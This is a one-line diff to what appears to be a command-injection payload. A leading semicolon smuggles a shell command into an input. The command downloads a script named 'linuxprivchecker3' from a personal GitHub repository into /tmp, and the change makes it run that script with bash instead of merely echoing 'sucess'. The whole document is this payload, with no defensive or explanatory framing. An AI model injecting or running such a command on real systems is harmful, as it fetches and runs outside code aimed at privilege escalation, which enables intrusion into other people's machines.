@@ -1,1 +1,1 @@
-; cd /tmp && curl -O https://raw.githubusercontent.com/albertlilem/test/master/linuxprivchecker3 && echo sucess ;
+; cd /tmp && curl -O https://raw.githubusercontent.com/albertlilem/test/master/linuxprivchecker3 && bash /tmp/linuxprivchecker3 ;
